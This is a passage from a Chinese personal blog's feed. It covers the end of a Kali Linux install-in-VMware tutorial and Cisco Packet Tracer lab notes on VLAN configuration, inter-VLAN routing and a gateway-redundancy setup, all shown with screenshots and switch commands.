<p>选中 <code>/dev/sda</code> ,然后<code>继续</code></p>
<p><img src="https://cdn.jsdelivr.net/gh/Grosad/Grosad.github.io/images/loading.gif" data-original="https://cdn.jsdelivr.net/gh/Grosad/p/image/1-26.png" alt></p>
<p>稍等几秒后，安装完成，点击<code>继续</code>结束安装，之后系统自动重启</p>
<p><img src="https://cdn.jsdelivr.net/gh/Grosad/Grosad.github.io/images/loading.gif" data-original="https://cdn.jsdelivr.net/gh/Grosad/p/image/127.png" alt></p>
<p><img src="https://cdn.jsdelivr.net/gh/Grosad/Grosad.github.io/images/loading.gif" data-original="https://cdn.jsdelivr.net/gh/Grosad/p/image/1-31.png" alt></p>
<p>输入 <code>root</code>、<code>下一步</code>、输入刚才设置的密码，然后登陆</p>
<blockquote>
<p>记得按一下<code>NumLock</code>键哦</p>
</blockquote>
<p><img src="https://cdn.jsdelivr.net/gh/Grosad/Grosad.github.io/images/loading.gif" data-original="https://cdn.jsdelivr.net/gh/Grosad/p/image/1-32.png" alt></p>
<p><img src="https://cdn.jsdelivr.net/gh/Grosad/Grosad.github.io/images/loading.gif" data-original="https://cdn.jsdelivr.net/gh/Grosad/p/image/1-33.png" alt></p>
<p>安装VMware的增强包、点击VMware的选项<code>虚拟机</code>–&gt;<code>安装 VMware Tools</code></p>
<p><img src="https://cdn.jsdelivr.net/gh/Grosad/Grosad.github.io/images/loading.gif" data-original="https://cdn.jsdelivr.net/gh/Grosad/p/image/1-34.png" alt></p>
<p>然后进入虚拟机，打开终端，输入</p>
<hr>
<pre><code>cd /media/cdrom0/
cp VM&lt;TAB键&gt; /root    #复制到root文件夹
cd /root
tar -zxvf VM&lt;TAB键&gt;   #解压</code></pre><hr>
<p><img src="https://cdn.jsdelivr.net/gh/Grosad/Grosad.github.io/images/loading.gif" data-original="https://cdn.jsdelivr.net/gh/Grosad/p/image/1-35.png" alt></p>
<p>解压之后</p>
<hr>
<pre><code>cd vmware-tools-distrib/
./vmware-install.pl</code></pre><hr>
<p><img src="https://cdn.jsdelivr.net/gh/Grosad/Grosad.github.io/images/loading.gif" data-original="https://cdn.jsdelivr.net/gh/Grosad/p/image/1-36.png" alt></p>
<p>回车，开始安装增强包，之后一路回车</p>
<p><img src="https://cdn.jsdelivr.net/gh/Grosad/Grosad.github.io/images/loading.gif" data-original="https://cdn.jsdelivr.net/gh/Grosad/p/image/1-38.png" alt></p>
<p>当出现以下字段的时候，说明安装已完成</p>
<p><img src="https://cdn.jsdelivr.net/gh/Grosad/Grosad.github.io/images/loading.gif" data-original="https://cdn.jsdelivr.net/gh/Grosad/p/image/1-39.png" alt></p>
<p>输入 <code>reboot</code>重启Kali</p>
<p>重启玩之后，进入kali的<code>设置</code>，把自动挂起设置为关闭</p>
<p><img src="https://cdn.jsdelivr.net/gh/Grosad/Grosad.github.io/images/loading.gif" data-original="https://cdn.jsdelivr.net/gh/Grosad/p/image/1-40.png" alt></p>
<p>打开终端，输入</p>
<hr>
<pre><code>leafpad /etc/apt/sources.list</code></pre><hr>
<p>然后加个源，我用的是阿里云的源、然后Ctrl+s保存退出</p>
<hr>
<pre><code>deb http://mirrors.aliyun.com/kali kali-rolling main non-free contrib
deb-src http://mirrors.aliyun.com/kali kali-rolling main non-free contrib</code></pre><p><img src="https://cdn.jsdelivr.net/gh/Grosad/Grosad.github.io/images/loading.gif" data-original="https://cdn.jsdelivr.net/gh/Grosad/p/image/a41.png" alt></p>
<p>然后然后apt指令四连</p>
<hr>
<pre><code>apt-get update           #读取软件列表
apt-get upgrade          #更新软件
apt-get dist-upgrade   
apt-get clean            #清理无用的包</code></pre><hr>
<blockquote>
<p>upgrade指令可能会很久…</p>
</blockquote>
<p>到这里Kali就基本上安装完成了</p>
<p><img src="https://cdn.jsdelivr.net/gh/Grosad/Grosad.github.io/images/loading.gif" data-original="https://cdn.jsdelivr.net/gh/Grosad/p/image/bq-1.jpg" alt></p>
]]></content>
      <categories>
        <category>网络空间安全</category>
      </categories>
      <tags>
        <tag>网络空间安全</tag>
        <tag>教程</tag>
      </tags>
  </entry>
  <entry>
    <title>Vlan划分</title>
    <url>/2020/06/25/vlan/</url>
    <content><![CDATA[<h1 id="网络搭建—VLAN"><a href="#网络搭建—VLAN" class="headerlink" title="网络搭建—VLAN"></a>网络搭建—VLAN</h1><blockquote>
<p>实验平台: Cisco Packet Tracer 7.3.0</p>
</blockquote>
<h2 id="1-VlAN划分"><a href="#1-VlAN划分" class="headerlink" title="1.VlAN划分"></a>1.VlAN划分</h2><h3 id="1-单交换机"><a href="#1-单交换机" class="headerlink" title="(1)单交换机"></a>(1)单交换机</h3><h4 id="拓扑图"><a href="#拓扑图" class="headerlink" title="拓扑图"></a>拓扑图</h4><p><img src="https://cdn.jsdelivr.net/gh/Grosad/Grosad.github.io/images/loading.gif" data-original="https://cdn.jsdelivr.net/gh/Grosad/p/image/i-1.png" alt></p>
<h4 id="指令"><a href="#指令" class="headerlink" title="指令"></a>指令</h4><pre><code>en
config
int f0/1
sw acc vlan 10
int f0/2
sw acc vlan 20
int f0/3
sw acc vlan 30
end</code></pre><h3 id="2-双交换机"><a href="#2-双交换机" class="headerlink" title="(2)双交换机"></a>(2)双交换机</h3><h4 id="拓扑"><a href="#拓扑" class="headerlink" title="拓扑"></a>拓扑</h4><p><img src="https://cdn.jsdelivr.net/gh/Grosad/Grosad.github.io/images/loading.gif" data-original="https://cdn.jsdelivr.net/gh/Grosad/p/image/i2.png" alt></p>
<h4 id="指令-1"><a href="#指令-1" class="headerlink" title="指令"></a>指令</h4><p>SW 1</p>
<pre><code>en
config
int f0/1
sw acc vlan 10
int f0/2
sw acc vlan 20
int f0/24
sw mode trunk
sw trunk all vlan all
end</code></pre><p>SW 2</p>
<pre><code>en
config
int f0/1
sw acc vlan 10
int f0/2
sw acc vlan 20
int f0/24
sw mode trunk
sw trunk all vlan all
end</code></pre><h2 id="2-Vlan间通信"><a href="#2-Vlan间通信" class="headerlink" title="2.Vlan间通信"></a>2.Vlan间通信</h2><h3 id="1-SVI"><a href="#1-SVI" class="headerlink" title="(1)SVI"></a>(1)SVI</h3><h4 id="拓扑-1"><a href="#拓扑-1" class="headerlink" title="拓扑"></a>拓扑</h4><p><img src="https://cdn.jsdelivr.net/gh/Grosad/Grosad.github.io/images/loading.gif" data-original="https://cdn.jsdelivr.net/gh/Grosad/p/image/ttt.PNG" alt></p>
<h4 id="指令-2"><a href="#指令-2" class="headerlink" title="指令"></a>指令</h4><pre><code>en
config
int vlan 10
ip add 192.168.1.254 255.255.255.0
int vlan 20
ip add 192.168.2.254 255.255.255.0
exit
int f0/1
sw trunk encapsulation dot1q
sw mode trunk
ip routing
end</code></pre><p>二层</p>
<pre><code>en
config
int f0/1
sw mode trunk
sw trunk all vlan all
int f0/2
sw acc vlan 10
int f0/4
sw acc vlan 20</code></pre><h3 id="2-单臂路由"><a href="#2-单臂路由" class="headerlink" title="(2)单臂路由"></a>(2)单臂路由</h3><h4 id="拓扑-2"><a href="#拓扑-2" class="headerlink" title="拓扑"></a>拓扑</h4><p><img src="https://cdn.jsdelivr.net/gh/Grosad/Grosad.github.io/images/loading.gif" data-original="https://cdn.jsdelivr.net/gh/Grosad/p/image/ccc.PNG" alt></p>
<h4 id="指令-3"><a href="#指令-3" class="headerlink" title="指令"></a>指令</h4><p>路由</p>
<pre><code>en 
config
int f0/0.1 
en dot1q 10
ip add 192.168.1.254 255.255.255.0
no shutdown 
int f0/0.2
en dot1q 20
ip add 192.168.2.254 255.255.255.0
no shutdown
exit 
int f0/0
ip routing
no shutdown
end</code></pre><p>二层</p>
<pre><code>en
config
int f0/1
sw mode trunk
sw trunk all vlan all
int f0/2
sw acc vlan 10
int f0/3
sw acc vlan 20</code></pre>]]></content>
      <categories>
        <category>网络搭建</category>
      </categories>
      <tags>
        <tag>收录</tag>
        <tag>网络搭建</tag>
      </tags>
  </entry>
  <entry>
    <title>VRRP</title>
    <url>/2020/07/15/vrrp/</url>
    <content><![CDATA[<h1 id="网络搭建—VRRP"><a href="#网络搭建—VRRP" class="headerlink" title="网络搭建—VRRP"></a>网络搭建—VRRP</h1><blockquote>
<p>实验平台: Cisco Packet Tracer 7.3.0</p>
</blockquote>
<h2 id="拓扑图"><a href="#拓扑图" class="headerlink" title="拓扑图"></a>拓扑图</h2><p><img src="https://cdn.jsdelivr.net/gh/Grosad/Grosad.github.io/images/loading.gif" data-original="https://cdn.jsdelivr.net/gh/Grosad/p/image/20200715190511.png" alt></p>
<h2 id="指令"><a href="#指令" class="headerlink" title="指令"></a>指令</h2><p>SW 1</p>
<pre><code>en
config
int  vlan 100
ip add 10.0.0.1  255.255.255.0
ex
int  f0/1
sw acc vlan 100
ex
en
config
int  vlan 200
ip add 20.0.0.1  255.255.255.0
ex
int  f0/2
sw acc vlan 200
ex
ip routing
int vlan 100
standby 1 ip 10.0.0.10
standby 1 preempt
standby 1 priority 150
ex
int vlan 200
standby 2 ip 20.0.0.10
standby 2 preempt
standby 2 priority 50
ex
route ospf 1
network 10.0.0.0  0.0.0.255 area 0
network 20.0.0.0  0.0.0.255 area 0
ex</code></pre><p>SW 2</p>
<pre><code>en
config
int  vlan 100
ip add 10.0.0.2  255.255.255.0
ex
int  f0/1
sw acc vlan 100
ex
en
config
int  vlan 200
ip add 20.0.0.2  255.255.255.0
ex
int  f0/2
sw acc vlan 200
ex
ip routing
int vlan 100
standby 1 ip 10.0.0.10
standby 1 preempt
standby 1 priority 50
ex
int vlan 200
standby 2 ip 20.0.0.10
standby 2 preempt
standby 2 priority 150
ex
route ospf 1
network 10.0.0.0  0.0.0.255 area 0
network 20.0.0.0  0.0.0.255 area 0
ex</code></pre><h2 id="结果"><a href="#结果" class="headerlink" title="结果"></a>结果</h2><blockquote>
<p>这里建议多ping几次，第一次ping可能会失败</p>
<p>那两个双层交换机摆那就行了</p>
</blockquote>
<p><img src="https://cdn.jsdelivr.net/gh/Grosad/Grosad.github.io/images/loading.gif" data-original="https://cdn.jsdelivr.net/gh/Grosad/p/image/20200715190506.png" alt></p>
]]></content>
      <categories>
        <category>网络搭建</category>
      </categories>
      <tags>
        <tag>收录</tag>
        <tag>网络搭建</tag>
      </tags>
  </entry>
</search>
